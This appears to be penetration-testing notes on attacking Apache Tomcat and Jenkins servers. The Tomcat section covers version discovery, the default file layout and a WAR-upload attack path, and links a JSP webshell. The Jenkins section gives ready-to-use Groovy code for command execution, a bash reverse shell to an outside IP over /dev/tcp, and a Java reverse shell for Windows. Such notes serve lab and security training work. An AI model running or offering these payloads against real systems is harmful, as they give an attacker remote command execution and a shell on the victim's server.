# Attacking Servlet Containers/Software Development

### Tomcat - Discovery & Enumeration

Discover version from error page:

<img width="918" height="220" alt="image" src="https://github.com/user-attachments/assets/dba5c286-dbd2-41cb-9dfd-f63cecd0e697" />

Method: insert invalid page 


The _bin_ folder stores scripts and binaries needed to start and run a Tomcat server. 

The _conf_ folder stores various configuration files used by Tomcat. 

The **_tomcat-users.xml_** file stores user credentials and their assigned roles. 

The _lib_ folder holds the various JAR files needed for the correct functioning of Tomcat. 

The _logs_ and temp folders store temporary log files. 

The _webapps_ folder is the default webroot of Tomcat and hosts all the applications. 

The _work_ folder acts as a cache and is used to store data during runtime.


Default tree:

<img width="924" height="508" alt="image" src="https://github.com/user-attachments/assets/00ac2510-9533-4eb1-af5e-ba28d7f46843" />

<img width="940" height="377" alt="image" src="https://github.com/user-attachments/assets/e5f689c2-a319-4b3a-84e0-dec24c9b99a1" />

The most important file among these is WEB-INF/web.xml, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder. These classes might contain important business logic as well as sensitive information. Any vulnerability in these files can lead to total compromise of the website. The lib folder stores the libraries needed by that particular application. The jsp folder stores Jakarta Server Pages (JSP), formerly known as JavaServer Pages, which can be compared to PHP files on an Apache server.

### Tomcat attack path:

War upload 
https://en.wikipedia.org/wiki/WAR_(file_format)#:~:text=In%20software%20engineering%2C%20a%20WAR,that%20together%20constitute%20a%20web

https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

Direct vulnerabilities like: CVE-2020-1938 : Ghostcat


### Jenkins / Groovy script execution:
**Commnad exec Groovy:**
``` def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout ```


**RevShell Groovy:**

``` r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor() ```

**Rev Shell for Windows:**

```String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close(); ```




